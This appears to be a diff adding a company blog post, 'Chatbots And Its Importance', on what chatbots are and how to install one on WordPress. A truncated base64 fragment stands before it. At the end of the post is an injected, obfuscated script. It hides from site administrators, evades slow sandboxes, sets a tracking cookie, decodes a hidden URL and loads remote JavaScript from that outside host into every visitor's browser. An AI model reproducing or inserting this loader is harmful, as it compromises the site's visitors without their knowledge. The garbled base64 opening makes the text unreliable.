YWRpbmciPkhvdyBkb2VzIEFJIGNoYXRib3RzIGltcHJvdmUgdGhlIHVzZXIgZXhwZXJpZW5jZT88L2gzPgoKPHA+QUkgY2hhdCBib3RzIGNhbiBwcm92aWRlIHF1aWNrLCBwZXJzb25hbGl6ZWQgcmVzcG9uc2VzLCBpbXByb3ZpbmcgY3VzdG9tZXIgZW5nYWdlbWVudC4gVGhleSBjYW4gaGFuZGxlIG11bHRpcGxlIGlucXVpcmllcyBzaW11bHRhbmVvdXNseSwgb2ZmZXIgcm91bmQtdGhlLWNsb2NrIHN1cHBvcnQsIGFuZCBsZWFybiBmcm9tIHBhc3QgaW50ZXJhY3Rpb25zIHRvIGltcHJvdmUgZnV0dXJlIHJlc3BvbnNlcy48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPldoYXQgaW5kdXN0cmllcyBjYW4gYmVuZWZpdCBmcm9tIGNoYXQgYm90IG9ubGluZSBzZXJ2aWNlcz88L2gzPgoKPHA+QWxtb3N0IGV2ZXJ5IGluZHVzdHJ5LCBpbmNsdWRpbmcgcmV0YWlsLCBoZWFsdGhjYXJlLCBlZHVjYXRpb24sIGZpbmFuY2UsIGFuZCBob3NwaXRhbGl0eSwgY2FuIGJlbmVmaXQgZnJvbSBvbmxpbmUgY2hhdCBib3Qgc2VydmljZXMuIFRoZXkgY2FuIGVuaGFuY2UgY3VzdG9tZXIgc3VwcG9ydCwgb2ZmZXIgcGVyc29uYWxpemVkIHJlY29tbWVuZGF0aW9ucywgYXV0b21hdGUgcm91dGluZSB0YXNrcywgYW5kIG11Y2ggbW9yZS48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPkFyZSBjaGF0IGJvdHMgcmVwbGFjaW5nIGh1bWFuIGpvYnM/PC9oMz4KCjxwPldoaWxlIGNoYXQgYm90cyBhdXRvbWF0ZSBjZXJ0YWluIHRhc2tzLCB0aGV5IGRvIG5vdCBlbnRpcmVseSByZXBsYWNlIGh1bWFucy4gSW5zdGVhZCwgdGhleSBmcmVlIHVwIGh1bWFuIHJlc291cmNlcyBmb3IgbW9yZSBjb21wbGV4IGFuZCBjcmVhdGl2ZSB0YXNrcy4gSXQncyBhYm91dCBjb2xsYWJvcmF0aW9uLCBub3QgcmVwbGFjZW1lbnQuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5Db25jbHVzaW9uPC9oMj4KCjxwPkFzIHdlIGpvdXJuZXkgZnVydGhlciBpbnRvIHRoZSBkaWdpdGFsIGFnZSwgY2hhdCBib3RzIGFyZSBzZXQgdG8gYmVjb21lIGV2ZW4gbW9yZSBpbnRlZ3JhbCBpbiBvdXIgb25saW5lIGludGVyYWN0aW9ucy4gVGhlIGJsZW5kIG9mIEFJLCBNTCwgYW5kIE5MUCBpbiBjaGF0IGJvdCB0ZWNobm9sb2d5IGlzIGNyZWF0aW5nIG1vcmUgc2VhbWxlc3MsIHBlcnNvbmFsaXplZCwgYW5kIGVmZmljaWVudCB1c2VyIGV4cGVyaWVuY2VzLiBUaGVpciBwb3RlbnRpYWwgaXMgdmFzdCwgYW5kIHdoaWxlIHRoZXJlIGFyZSBjaGFsbGVuZ2VzIHRvIG92ZXJjb21lLCB0aGUgZnV0dXJlIG9mIHRoZSBjaGF0IGJvdCBsb29rcyBwcm9taXNpbmcuIEFzIHdlIGxlYXJuIGFuZCBhZGFwdCwgc28gdG9vIHdpbGwgb3VyIEFJIGNvbXBhbmlvbnMsIHBhdmluZyB0aGUgd2F5IGZvciBhbiBleGNpdGluZyBkaWdpdGFsIGZ1dHVyZS48L3A+Cgo8cD5MZWFybiBtb3JlIGFib3V0IGNoYXRib3RzIGZvciB5b3VyIGJ1c2luZXNzLiA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9nZXQtaW4tdG91Y2gvIj5Db250YWN0IHVzPC9hPiB0byByZXF1ZXN0IGEgZnJlZSBjb25zdWx0YXRpb24uPC9wPgo8c2NyaXB0PihmdW5jdGlvbigpe3RyeXtpZihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dwYWRtaW5iYXInKSlyZXR1cm47dmFyIHQwPStuZXcgRGF0ZSgpO2Zvcih2YXIgaT0wO2k8MjAwMDA7aSsrKXt2YXIgej1pKmk7fWlmKCgrbmV3IERhdGUoKSktdDA+MTIwKXJldHVybjtpZigoZG9jdW1lbnQuY29va2llfHwnJykuaW5kZXhPZignaHR0cDJfc2Vzc2lvbl9pZD0nKSE9PS0xKXJldHVybjtmdW5jdGlvbiBzeXN0ZW1Mb2FkKGlucHV0KXt2YXIga2V5PSdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvPScsbzEsbzIsbzMsaDEsaDIsaDMsaDQsZGVjPScnLGk9MDtpbnB1dD1pbnB1dC5yZXBsYWNlKC9bXkEtWmEtejAtOVwrXC9cPV0vZywnJyk7d2hpbGUoaTxpbnB1dC5sZW5ndGgpe2gxPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMj1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDM9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2g0PWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtvMT0oaDE8PDIpfChoMj4+NCk7bzI9KChoMiYxNSk8PDQpfChoMz4+Mik7bzM9KChoMyYzKTw8Nil8aDQ7ZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8xKTtpZihoMyE9NjQpZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8yKTtpZihoNCE9NjQpZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8zKTt9cmV0dXJuIGRlYzt9dmFyIHU9c3lzdGVtTG9hZCgnYUhSMGNITTZMeTl6WldGeVkyaHlZVzVyZEhKaFptWnBZeTVzYVhabEwycHplQT09Jyk7aWYodHlwZW9mIHdpbmRvdyE9PSd1bmRlZmluZWQnJiZ3aW5kb3cuX19ybD09PXUpcmV0dXJuO3ZhciBkPW5ldyBEYXRlKCk7ZC5zZXRUaW1lKGQuZ2V0VGltZSgpKzMwKjI0KjYwKjYwKjEwMDApO2RvY3VtZW50LmNvb2tpZT0naHR0cDJfc2Vzc2lvbl9pZD0xOyBleHBpcmVzPScrZC50b1VUQ1N0cmluZygpKyc7IHBhdGg9LzsgU2FtZVNpdGU9TGF4JysobG9jYXRpb24ucHJvdG9jb2w9PT0naHR0cHM6Jz8nOyBTZWN1cmUnOicnKTt0cnl7d2luZG93Ll9fcmw9dTt9Y2F0Y2goZSl7fXZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3MudHlwZT0ndGV4dC9qYXZhc2NyaXB0JztzLmFzeW5jPXRydWU7cy5zcmM9dTt0cnl7cy5zZXRBdHRyaWJ1dGUoJ2RhdGEtcmwnLHUpO31jYXRjaChlKXt9KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF18fGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCkuYXBwZW5kQ2hpbGQocyk7fWNhdGNoKGUpe319KSgpOzwvc2NyaXB0Pgo="}
+---
+title: "Chatbots And Its Importance"
+slug: "chatbots-and-its-importance"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Chatbots And Its Importance"
+keywords: ["chatbots and its importance","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2020/11/Chatbots-And-Its-Importance-scaled.jpg"
+---
+
+<h2 class="wp-block-heading" id="h-what-is-a-chatbot">What is a chatbot?</h2>
+
+<p>It is an artificial intelligence (AI) software or a computer program that conducts a conversation through audio or textual methods. In the modern era, the ability to communicate effectively and efficiently holds a significant place. Technological advancements have propelled us into an age where we can connect instantly with anyone, anywhere. At the heart of this digital transformation, the concept of the chatbot has become increasingly prevalent. These interactive programs, powered by Artificial Intelligence (AI), are reshaping the ways we communicate online, opening up a wealth of opportunities and challenges.</p>
+
+<h2 class="wp-block-heading">Why are chatbots important?</h2>
+
+<p>A chatbot represents the natural evolution of a Question-answer system leveraging Natural Language Processing (NLP). Formulating responses to questions in a native language is applied in various enterprise end-use applications.</p>
+
+<h2 class="wp-block-heading" id="h-chat-bot-a-virtual-communication-powerhouse">Chat Bot: A Virtual Communication Powerhouse</h2>
+
+<p>A chatbot, also known as an AI chatbot, is a program designed to simulate human-like conversations. They can respond to text inputs with appropriate responses and even understand natural language using technologies like Natural Language Processing (NLP). Bot chat online services have become popular due to their potential to provide 24/7 customer service, generate leads, and facilitate smooth customer experiences.</p>
+
+<h2 class="wp-block-heading" id="h-how-does-a-chatbot-work">How does a Chatbot work?</h2>
+
+<p>Chatbots works on three methods:</p>
+
+<ul>
+<li><strong>Pattern Matches</strong></li>
+
+<li><strong>Natural Language Understanding (NLU)</strong></li>
+
+<li><strong>Natural Language Processing (NLP)</strong></li>
+</ul>
+
+<h2 class="wp-block-heading" id="h-pattern-matches"><strong>Pattern Matches</strong></h2>
+
+<p>Chatbots utilizes pattern matches to classify the text or speech, and it produces a suitable response to the user. A standard structure model of these patterns is called Artificial Intelligence Markup Language (AIML). It is a programming language which is Extensible Markup Language (XML) dialect used by chatbots.</p>
+
+<p><strong>A simple example of Pattern Matching:</strong></p>
+
+<p>WHO IS BILL GATES?</p>
+
+<p>Bill Gates is an American business entrepreneur, author, investor, philanthropist, humanitarian, and known as the principal founder of Microsoft Corporation.</p>
+
+<h2 class="wp-block-heading">Role and Advantages of Online Chat Bots</h2>
+
+<p>An online chat bot, available around the clock, can instantly respond to user queries. Whether it's customer support, information dissemination, or user engagement, chat bots are revolutionizing various industry sectors. They offer:</p>
+
+<p><strong>1. 24/7 Availability: </strong>Chat bots provide continuous availability, resolving queries outside traditional working hours.</p>
+
+<p><strong>2. Efficiency: </strong>They can handle multiple requests simultaneously, reducing waiting times.</p>
+
+<p><strong>3. Consistency:</strong> They deliver consistent responses to common questions.</p>
+
+<p><strong>4. Cost Savings: </strong>By automating tasks, they save human resources and costs.</p>
+
+<h3 class="wp-block-heading" id="h-then-the-machine-gives-an-output">Then the machine gives an output</h3>
+
+<p><strong>Human: </strong>Do you know who Bill Gates is?</p>
+
+<p><strong>Chatbot: </strong>Bill Gates is an American business magnate, investor, author, philanthropist, humanitarian, and known as the principal founder of Microsoft Corporation.</p>
+
+<p>Chatbots only knows the answer because the given name is in the associated pattern. But chatbots can not go beyond the related pattern.</p>
+
+<h2 class="wp-block-heading" id="h-natural-language-understanding-nlu"><strong>Natural Language Understanding (NLU)</strong></h2>
+
+<p><a href="https://en.wikipedia.org/wiki/Natural-language_understanding">Natural Language Understanding</a> is a subtopic of Natural Language Processing in artificial intelligence (AI) that deals with machine reading comprehension. It uses the power of machine learning to convert speech to text and analyze its intent during any interaction.</p>
+
+<h2 class="wp-block-heading" id="h-natural-language-processing-nlp"><strong>Natural Language Processing (NLP)</strong></h2>
+
+<p><a href="https://en.wikipedia.org/wiki/Natural_language_processing">Natural Language Processing</a> is a subfield of Artificial Intelligence (AI) concerned with the interaction of humans and computers. The process where chatbots take some combination of steps to convert the user's text or speech into structured data and used it to select the best answer to the query.</p>
+
+<h2 class="wp-block-heading" id="h-why-are-chatbots-important"><strong>Why are chatbots important?</strong></h2>
+
+<h3 class="wp-block-heading" id="h-1-improves-customer-service">1. <strong>Improves Customer Service:</strong></h3>
+
+<ul>
+<li><h3><strong>Extensive Customer Assistance</strong></h3>
+<ul>
+<li>83% of online customers need support when they shop online. They may require help in understanding which product/service for their need or budget any time of the day. Chatbots can provide customer assistance anytime, like a real salesperson in a store.</li>
+</ul>
+</li>
+
+<li><h3><strong>Always-Available Customer Support</strong></h3>
+<ul>
+<li>Chatbots can improve customer support. They are programmed to give an automatic answer to customers repetitive questions and forward the request to a real person if the problem needs a more complicated response.</li>
+</ul>
+</li>
+
+<li><h3><strong>Proactive Customer Interaction</strong></h3>
+<ul>
+<li>Chatbots can proactively start a conversation with your customers beyond the routine "Welcome To Our Website." These make your customers feel your brand is one step ahead and help improve your brand perception in the long run.</li>
+</ul>
+</li>
+</ul>
+
+<h3 class="wp-block-heading" id="h-2-increase-customer-engagement">2. <strong>Increase Customer Engagement</strong></h3>
+
+<ul>
+<li>Chatbots offer a real-time, one-to-one conversation that engages customers. They can increase the response rate by being available at any time of the day.</li>
+</ul>
+
+<h3 class="wp-block-heading" id="h-3-monitoring-consumer-date-and-gives-insights">3. <strong>Monitoring Consumer Date And Gives Insights.</strong></h3>
+
+<ul>
+<li>With feedbacks, chatbots can collect data through simple questions that can give you insights that can help improve your products or services. It can even help you optimize your website by using the data collected for improving your low concerting pages.</li>
+</ul>
+
+<div style="height:35px" aria-hidden="true" class="wp-block-spacer"></div>
+
+<h3 class="wp-block-heading" id="h-4-better-lead-generation">4. <strong>Better Lead Generation</strong></h3>
+
+<ul>
+<li>Chatbots can ask necessary and most related questions, persuade other users and generate leads for you.</li>
+</ul>
+
+<p>Chatbots with artificial intelligence are dramatically changing the digital business world. It can reach out to a broad audience by responding to customers in real-time and be more effective than human. One of the most significant benefits of chatbots in your business is they save time. They can provide fast and automated answers to your visitor's questions and prevent them from waiting a day or longer to receive a response as they would have in the past.</p>
+
+<h2 class="wp-block-heading" id="h-how-to-set-up-chat-bot-on-wordpress"><strong>How to Set up Chat Bot on WordPress</strong></h2>
+
+<h3 class="wp-block-heading">1. <strong>Choose a Chatbot Plugin or Service</strong></h3>
+
+<p>There are numerous chatbot plugins and services available for WordPress. Some popular ones are:</p>
+
+<ul>
+<li>WP-Chatbot for Messenger</li>
+
+<li>Tidio Live Chat</li>
+
+<li>Drift</li>
+
+<li>ChatBot for WordPress</li>
+</ul>
+
+<p><strong>Note:</strong> Your choice might depend on the bot's purpose, the complexity of the conversations you want to manage, and other integration requirements.</p>
+
+<h3 class="wp-block-heading">2. <strong>Install the Plugin</strong></h3>
+
+<ol>
+<li><strong>Via WordPress Dashboard:</strong> a. Log in to your WordPress dashboard. b. Navigate to 'Plugins' &gt; 'Add New'. c. Search for your chosen chatbot plugin. d. Click 'Install Now' and then 'Activate'.</li>
+
+<li><strong>Via Manual Upload:</strong> a. Download the plugin's zip file from the source. b. Go to 'Plugins' &gt; 'Add New' &gt; 'Upload Plugin' in your WordPress dashboard. c. Upload the downloaded zip file. d. Click 'Install Now' and then 'Activate'.</li>
+</ol>
+
+<h3 class="wp-block-heading">3. <strong>Configure the Plugin</strong></h3>
+
+<ol>
+<li>After activation, most chatbot plugins will add a new menu item to the WordPress dashboard.</li>
+
+<li>Click on this new menu item to open the chatbot settings.</li>
+
+<li>Depending on the plugin, you might need to:a. <strong>Connect with an external account</strong>: Some chatbots, especially those tied to services like Facebook Messenger, will require you to link an account.b. <strong>Set up bot responses</strong>: Define how the bot should reply to specific user inputs or questions. Some bots offer drag-and-drop interfaces for this.c. <strong>Customize appearance</strong>: Adjust the look of the chat widget to match your site's design.</li>
+</ol>
+
+<h3 class="wp-block-heading">4. <strong>Train Your Chatbot</strong></h3>
+
+<p>For more sophisticated chatbot plugins or services that utilize AI, there will often be a period of "training". This is where you input potential questions and provide the bot with appropriate answers. The more you train the bot, the better it gets at understanding user queries.</p>
+
+<h3 class="wp-block-heading">5. <strong>Test the Chatbot</strong></h3>
+
+<p>Before going live:</p>
+
+<ol>
+<li>Visit your website and interact with the chatbot.</li>
+
+<li>Make sure it's responding correctly.</li>
+
+<li>Adjust and refine any messages or settings as needed.</li>
+</ol>
+
+<h3 class="wp-block-heading">6. <strong>Integrate with Other Tools (Optional)</strong></h3>
+
+<p>Depending on your needs, you might want the chatbot to integrate with other tools like email marketing software, CRM systems, or analytics tools. Check the chatbot settings or the documentation for available integrations.</p>
+
+<h3 class="wp-block-heading">7. <strong>Monitor and Improve</strong></h3>
+
+<p>Once your chatbot is live:</p>
+
+<ol>
+<li>Monitor its interactions with users.</li>
+
+<li>Gather feedback from your website visitors.</li>
+
+<li>Refine the chatbot's responses and capabilities based on the feedback and performance metrics.</li>
+</ol>
+
+<h3 class="wp-block-heading">Tips:</h3>
+
+<ul>
+<li><strong>Backup</strong>: Always back up your WordPress website before installing and activating new plugins.</li>
+
+<li><strong>GDPR &amp; Privacy</strong>: If you’re dealing with users from the EU or other regions with strict data protection regulations, ensure your chatbot complies with these rules. Inform users if you’re collecting data and for what purpose.</li>
+</ul>
+
+<h2 class="wp-block-heading">FAQs</h2>
+
+<h3 class="wp-block-heading">How does AI chatbots improve the user experience?</h3>
+
+<p>AI chat bots can provide quick, personalized responses, improving customer engagement. They can handle multiple inquiries simultaneously, offer round-the-clock support, and learn from past interactions to improve future responses.</p>
+
+<h3 class="wp-block-heading">What industries can benefit from chat bot online services?</h3>
+
+<p>Almost every industry, including retail, healthcare, education, finance, and hospitality, can benefit from online chat bot services. They can enhance customer support, offer personalized recommendations, automate routine tasks, and much more.</p>
+
+<h3 class="wp-block-heading">Are chat bots replacing human jobs?</h3>
+
+<p>While chat bots automate certain tasks, they do not entirely replace humans. Instead, they free up human resources for more complex and creative tasks. It's about collaboration, not replacement.</p>
+
+<h2 class="wp-block-heading">Conclusion</h2>
+
+<p>As we journey further into the digital age, chat bots are set to become even more integral in our online interactions. The blend of AI, ML, and NLP in chat bot technology is creating more seamless, personalized, and efficient user experiences. Their potential is vast, and while there are challenges to overcome, the future of the chat bot looks promising. As we learn and adapt, so too will our AI companions, paving the way for an exciting digital future.</p>
+
+<p>Learn more about chatbots for your business. <a href="https://canadianwebdesigns.ca/get-in-touch/">Contact us</a> to request a free consultation.</p>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
